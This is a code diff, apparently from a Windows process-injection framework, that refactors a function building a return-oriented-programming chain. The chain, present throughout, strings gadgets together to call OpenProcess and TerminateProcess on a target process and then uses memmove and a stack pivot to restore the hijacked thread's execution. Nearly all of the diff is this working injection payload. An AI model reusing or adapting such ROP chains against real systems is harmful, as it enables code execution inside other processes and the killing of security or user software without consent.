@@ -19,7 +19,10 @@ typedef struct {
 	size_t size;
 }TEXT_SECTION_INFO;
 
-
+void insertToRop(DWORD64* chain,DWORD64 *pos, DWORD64 value)
+{
+	chain[*pos] = value;
+}
 
 TEXT_SECTION_INFO GetTextSection(HMODULE mod)
 {
@@ -98,7 +101,10 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 {
 	LoadLibrary(L"gdi32.dll");
 
-	DWORD64* ROP_chain, rop_pos = 0;
+	DWORD64* ROP_chain;
+	int *rop_pos = (int*)malloc(sizeof(int));
+	*rop_pos = 0x0;
+	printf("%x --- %d\n%x --- %d\n",*rop_pos,*rop_pos,rop_pos,rop_pos);
 	CHAR location[] = "psapi.dll";
 	DWORD locSize = strlen(location);
 	WCHAR terminateStr[] = L"notepad.exe";
@@ -184,75 +190,78 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 	if (meow.dwMajorVersion == 10)
 	{
 		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // force stack alignment
-			ROP_chain[rop_pos++] = GADGET_ret;
+			ROP_chain[(*rop_pos)++] = GADGET_ret;
 
 		// Windows10 ---> r8 first type 
 		if (GADGET_popr8)
 		{
 			// Prepare registers for OpenProcess
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			ROP_chain[rop_pos++] = FALSE; // rdx
-			ROP_chain[rop_pos++] = GADGET_popr8;
-			ROP_chain[rop_pos++] = terminatePid; // r8
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			
+			//insertToRop(ROP_chain, rop_pos, GADGET_poprcx);
+			//insertToRop(ROP_chain, rop_pos,PROCESS_TERMINATE);
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = PROCESS_TERMINATE; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			ROP_chain[(*rop_pos)++] = FALSE; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_popr8;
+			ROP_chain[(*rop_pos)++] = terminatePid; // r8
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 		// Windows10 ---> r8 second type 
 		else
 		{
 			// Prepare registers for OpenProcess
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			ROP_chain[rop_pos++] = FALSE; // rdx
-			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
-			ROP_chain[rop_pos++] = terminatePid; // rax
-			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = PROCESS_TERMINATE; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			ROP_chain[(*rop_pos)++] = FALSE; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_poprax; // rax -> r8
+			ROP_chain[(*rop_pos)++] = terminatePid; // rax
+			ROP_chain[(*rop_pos)++] = GADGET_movr8deax; // r8 <-
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 
 		// Call OpenProcess
-		ROP_chain[rop_pos++] = (DWORD64)OpenProcess;
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+		ROP_chain[(*rop_pos)++] = (DWORD64)OpenProcess;
+		ROP_chain[(*rop_pos)++] = GADGET_addrsp;
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 
 		//// Get returned handle into ECX
-		ROP_chain[rop_pos++] = GADGET_xchgeaxecx;
+		ROP_chain[(*rop_pos)++] = GADGET_xchgeaxecx;
 
 		// TerminateProcess by handle
-		ROP_chain[rop_pos++] = (DWORD64)TerminateProcess;
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+		ROP_chain[(*rop_pos)++] = (DWORD64)TerminateProcess;
+		ROP_chain[(*rop_pos)++] = GADGET_addrsp;
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 
 		DWORD64 saved_return_address;
 
@@ -260,58 +269,58 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 		if (GADGET_popr8)
 		{
 			// Prepare registers to memmove
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			saved_return_address = rop_pos++; // rdx
-			ROP_chain[rop_pos++] = GADGET_popr8;
-			ROP_chain[rop_pos++] = 8; // r8
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = runtime_parameters["orig_tos"]; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			saved_return_address = (*rop_pos)++; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_popr8;
+			ROP_chain[(*rop_pos)++] = 8; // r8
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 		// Windows10 ---> r8 second type 
 		else
 		{
 			// Prepare registers to memmove
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			saved_return_address = rop_pos++; // rdx
-			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
-			ROP_chain[rop_pos++] = 8; // rax
-			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = runtime_parameters["orig_tos"]; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			saved_return_address = (*rop_pos)++; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_poprax; // rax -> r8
+			ROP_chain[(*rop_pos)++] = 8; // rax
+			ROP_chain[(*rop_pos)++] = GADGET_movr8deax; // r8 <-
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 		// Call memmove and return to normal execution
-		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		ROP_chain[rop_pos++] = GADGET_pivot;
-		ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
+		ROP_chain[(*rop_pos)++] = (DWORD64)GetProcAddress(ntdll, "memmove");
+		ROP_chain[(*rop_pos)++] = GADGET_addrsp;
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
+		ROP_chain[(*rop_pos)++] = GADGET_pivot;
+		ROP_chain[(*rop_pos)++] = runtime_parameters["orig_tos"];
 
 		// Write text to stack
 		/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
@@ -319,13 +328,13 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 		rop_pos += locSize;*/
 
 		// Store new TOS 
-		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
-		ROP_chain[rop_pos++] = DONT_CARE;
+		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * (*rop_pos);
+		ROP_chain[(*rop_pos)++] = DONT_CARE;
 
 		// Update Runtime Parameters with ROP-specific Parameters
 		runtime_parameters["saved_return_address"] = saved_return_address;
 		runtime_parameters["GADGET_pivot"] = GADGET_pivot;
-		runtime_parameters["rop_pos"] = rop_pos;
+		runtime_parameters["rop_pos"] = *rop_pos;
 
 		output->buffer = ROP_chain;
 		output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
@@ -339,75 +348,75 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 	else
 	{
 		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
-			ROP_chain[rop_pos++] = GADGET_ret;
+			ROP_chain[(*rop_pos)++] = GADGET_ret;
 
 		// Windows10 ---> r8 first type 
 		if (GADGET_popr8)
 		{
 			// Prepare registers for OpenProcess
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			ROP_chain[rop_pos++] = FALSE; // rdx
-			ROP_chain[rop_pos++] = GADGET_popr8;
-			ROP_chain[rop_pos++] = terminatePid; // r8
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = PROCESS_TERMINATE; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			ROP_chain[(*rop_pos)++] = FALSE; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_popr8;
+			ROP_chain[(*rop_pos)++] = terminatePid; // r8
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 		// Windows10 ---> r8 second type 
 		else
 		{
 			// Prepare registers for OpenProcess
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			ROP_chain[rop_pos++] = FALSE; // rdx
-			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
-			ROP_chain[rop_pos++] = terminatePid; // rax
-			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = PROCESS_TERMINATE; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			ROP_chain[(*rop_pos)++] = FALSE; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_poprax; // rax -> r8
+			ROP_chain[(*rop_pos)++] = terminatePid; // rax
+			ROP_chain[(*rop_pos)++] = GADGET_movr8deax; // r8 <-
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 
 		// Call OpenProcess
-		ROP_chain[rop_pos++] = (DWORD64)OpenProcess;
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+		ROP_chain[(*rop_pos)++] = (DWORD64)OpenProcess;
+		ROP_chain[(*rop_pos)++] = GADGET_addrsp;
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 
 		//// Get returned handle into ECX
-		ROP_chain[rop_pos++] = GADGET_xchgeaxecx;
+		ROP_chain[(*rop_pos)++] = GADGET_xchgeaxecx;
 
 		// TerminateProcess by handle
-		ROP_chain[rop_pos++] = (DWORD64)TerminateProcess;
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+		ROP_chain[(*rop_pos)++] = (DWORD64)TerminateProcess;
+		ROP_chain[(*rop_pos)++] = GADGET_addrsp;
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 
 		DWORD64 saved_return_address;
 
@@ -415,58 +424,58 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 		if (GADGET_popr8)
 		{
 			// Prepare registers to memmove
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			saved_return_address = rop_pos++; // rdx
-			ROP_chain[rop_pos++] = GADGET_popr8;
-			ROP_chain[rop_pos++] = 8; // r8
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = runtime_parameters["orig_tos"]; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			saved_return_address = (*rop_pos)++; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_popr8;
+			ROP_chain[(*rop_pos)++] = 8; // r8
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 		// Windows10 ---> r8 second type 
 		else
 		{
 			// Prepare registers to memmove
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			saved_return_address = rop_pos++; // rdx
-			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
-			ROP_chain[rop_pos++] = 8; // rax
-			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprcx;
+			ROP_chain[(*rop_pos)++] = runtime_parameters["orig_tos"]; // rcx
+			ROP_chain[(*rop_pos)++] = GADGET_poprdx;
+			saved_return_address = (*rop_pos)++; // rdx
+			ROP_chain[(*rop_pos)++] = GADGET_poprax; // rax -> r8
+			ROP_chain[(*rop_pos)++] = 8; // rax
+			ROP_chain[(*rop_pos)++] = GADGET_movr8deax; // r8 <-
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
+			ROP_chain[(*rop_pos)++] = GADGET_poprax;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // rax -> r9
+			ROP_chain[(*rop_pos)++] = GADGET_movsxd;
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+			ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
 		}
 
 		// Call memmove and return to normal execution
-		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		ROP_chain[rop_pos++] = GADGET_pivot;
-		ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
+		ROP_chain[(*rop_pos)++] = (DWORD64)GetProcAddress(ntdll, "memmove");
+		ROP_chain[(*rop_pos)++] = GADGET_addrsp;
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // shadow space
+		ROP_chain[(*rop_pos)++] = DONT_CARE; // skipped by GADGET_addrsp
+		ROP_chain[(*rop_pos)++] = GADGET_pivot;
+		ROP_chain[(*rop_pos)++] = runtime_parameters["orig_tos"];
 
 		// Write text to stack
 		/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
@@ -474,13 +483,13 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 		rop_pos += locSize;*/
 
 		// Store new TOS 
-		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
-		ROP_chain[rop_pos++] = DONT_CARE;
+		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * (*rop_pos);
+		ROP_chain[(*rop_pos)++] = DONT_CARE;
 
 		// Update Runtime Parameters with ROP-specific Parameters
 		runtime_parameters["saved_return_address"] = saved_return_address;
 		runtime_parameters["GADGET_pivot"] = GADGET_pivot;
-		runtime_parameters["rop_pos"] = rop_pos;
+		runtime_parameters["rop_pos"] = *rop_pos;
 
 		output->buffer = ROP_chain;
 		output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
